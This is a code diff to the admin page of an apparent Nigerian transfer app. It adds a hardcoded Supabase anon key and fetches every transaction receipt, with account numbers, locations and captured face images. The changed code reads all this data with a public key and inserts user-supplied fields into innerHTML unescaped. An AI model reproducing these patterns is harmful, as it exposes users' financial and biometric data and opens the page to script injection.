@@ -64,7 +64,10 @@
         <div class="admin-main">
             <div class="admin-header">
                 <h2>Transaction Receipts</h2>
-                <button class="admin-logout" onclick="logout()">Logout</button>
+                <div style="display:flex;align-items:center;gap:15px;">
+                    <span id="connectionStatus" style="font-size:12px;color:#999;">Connecting...</span>
+                    <button class="admin-logout" onclick="logout()">Logout</button>
+                </div>
             </div>
             <div class="admin-content">
                 <div class="admin-stats">
@@ -104,8 +107,55 @@
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
     <script src="/js/supabase-client.js"></script>
     <script>
+        const SUPABASE_URL = 'https://rgnorcrlshskaindafzs.supabase.co';
+        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InJnbm9yY3Jsc2hza2FpbmRhZnpzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc2OTQ5MzgsImV4cCI6MjA5MzI3MDkzOH0.yluqapG5--VaXyGuSVdJYMeizewYLzkG3lbebVDu1pY';
+
         let allReceipts = [];
-        let loadError = false;
+        let fetchSuccess = false;
+
+        // Direct REST API fetch - bypasses Supabase JS client entirely
+        // This is the most reliable way to get data
+        async function fetchReceiptsDirect() {
+            const response = await fetch(SUPABASE_URL + '/rest/v1/receipts?select=*&order=created_at.desc', {
+                headers: {
+                    'apikey': SUPABASE_ANON_KEY,
+                    'Authorization': 'Bearer ' + SUPABASE_ANON_KEY,
+                    'Content-Type': 'application/json'
+                }
+            });
+            if (!response.ok) throw new Error('REST API returned ' + response.status);
+            return await response.json();
+        }
+
+        // Try multiple methods to fetch receipts - never give up
+        async function fetchReceipts() {
+            // Method 1: Direct REST API (most reliable)
+            try {
+                const data = await fetchReceiptsDirect();
+                if (data && data.length >= 0) return data;
+            } catch (e) {
+                console.error('REST API failed:', e);
+            }
+
+            // Method 2: Supabase JS client
+            try {
+                const data = await getAllReceiptsFromCloud();
+                if (data && data.length >= 0) return data;
+            } catch (e) {
+                console.error('Supabase JS failed:', e);
+            }
+
+            // Method 3: Retry REST API one more time
+            try {
+                await new Promise(r => setTimeout(r, 2000));
+                const data = await fetchReceiptsDirect();
+                if (data && data.length >= 0) return data;
+            } catch (e) {
+                console.error('REST API retry failed:', e);
+            }
+
+            return null; // All methods failed
+        }
 
         window.addEventListener('load', async () => {
             loadReceipts();
@@ -113,37 +163,54 @@
         });
 
         async function loadReceipts() {
-            const receipts = await getAllReceiptsFromCloud();
-            if (!receipts || receipts.length === 0) {
-                // Check if it's a real error vs no data
+            const receipts = await fetchReceipts();
+            const statusEl = document.getElementById('connectionStatus');
+
+            if (!receipts) {
+                // Fetch failed - DON'T wipe existing data, just show error
+                fetchSuccess = false;
+                if (statusEl) {
+                    statusEl.textContent = 'Connection error - retrying...';
+                    statusEl.style.color = '#e74c3c';
+                }
                 if (allReceipts.length === 0) {
-                    const receiptsList = document.getElementById('receiptsList');
-                    receiptsList.innerHTML = '<div class="admin-empty">Waiting for transactions...</div>';
+                    document.getElementById('receiptsList').innerHTML = '<div class="admin-empty">Loading... If this persists, check your internet connection.</div>';
                 }
                 return;
             }
-            loadError = false;
+
+            fetchSuccess = true;
+            if (statusEl) {
+                statusEl.textContent = 'Connected - Last updated ' + new Date().toLocaleTimeString();
+                statusEl.style.color = '#27ae60';
+            }
+
             allReceipts = receipts;
             const receiptsList = document.getElementById('receiptsList');
-            receiptsList.innerHTML = receipts.map(r => `
-                <div class="admin-receipt-item" onclick="viewReceipt('${r.id}')">
-                    <span class="admin-receipt-username">${r.username || 'Unknown'}</span>
-                    <span class="admin-receipt-time">${formatTime(r.created_at)}</span>
-                    <div style="clear: both;"></div>
-                    <div class="admin-receipt-details">
-                        <div>Amount: ₦${Number(r.amount || 0).toLocaleString('en-NG', {minimumFractionDigits: 2})}</div>
-                        <div>Bank: ${r.bank_name || 'N/A'}</div>
-                        <div>Account: ${r.account_number || 'N/A'}</div>
-                        <div>Type: ${r.transaction_type === 'credit' ? 'Top-up' : 'Transfer'}</div>
-                        <div>Narration: ${r.narration || 'N/A'}</div>
-                        <div>Ref: ${r.reference_number || 'N/A'}</div>
+
+            if (receipts.length === 0) {
+                receiptsList.innerHTML = '<div class="admin-empty">Waiting for transactions...</div>';
+            } else {
+                receiptsList.innerHTML = receipts.map(r => `
+                    <div class="admin-receipt-item" onclick="viewReceipt('${r.id}')">
+                        <span class="admin-receipt-username">${r.username || 'Unknown'}</span>
+                        <span class="admin-receipt-time">${formatTime(r.created_at)}</span>
+                        <div style="clear: both;"></div>
+                        <div class="admin-receipt-details">
+                            <div>Amount: ₦${Number(r.amount || 0).toLocaleString('en-NG', {minimumFractionDigits: 2})}</div>
+                            <div>Bank: ${r.bank_name || 'N/A'}</div>
+                            <div>Account: ${r.account_number || 'N/A'}</div>
+                            <div>Type: ${r.transaction_type === 'credit' ? 'Top-up' : 'Transfer'}</div>
+                            <div>Narration: ${r.narration || 'N/A'}</div>
+                            <div>Ref: ${r.reference_number || 'N/A'}</div>
+                        </div>
+                        ${r.location_latitude && r.location_longitude ? `<a href="https://maps.google.com/?q=${r.location_latitude},${r.location_longitude}" target="_blank" style="color:#667eea;font-size:12px;">View on Maps (${Number(r.location_latitude).toFixed(4)}, ${Number(r.location_longitude).toFixed(4)})</a>` : '<span style="color:#e74c3c;font-size:12px;">No location captured</span>'}
+                        <div class="admin-receipt-images">
+                            ${r.captured_face ? `<img src="${r.captured_face}" class="admin-receipt-image" title="Captured Face">` : ''}
+                        </div>
                     </div>
-                    ${r.location_latitude && r.location_longitude ? `<a href="https://maps.google.com/?q=${r.location_latitude},${r.location_longitude}" target="_blank" style="color:#667eea;font-size:12px;">View on Maps (${Number(r.location_latitude).toFixed(4)}, ${Number(r.location_longitude).toFixed(4)})</a>` : '<span style="color:#e74c3c;font-size:12px;">No location captured</span>'}
-                    <div class="admin-receipt-images">
-                        ${r.captured_face ? `<img src="${r.captured_face}" class="admin-receipt-image" title="Captured Face">` : ''}
-                    </div>
-                </div>
-            `).join('');
+                `).join('');
+            }
             updateStats(receipts);
         }
 
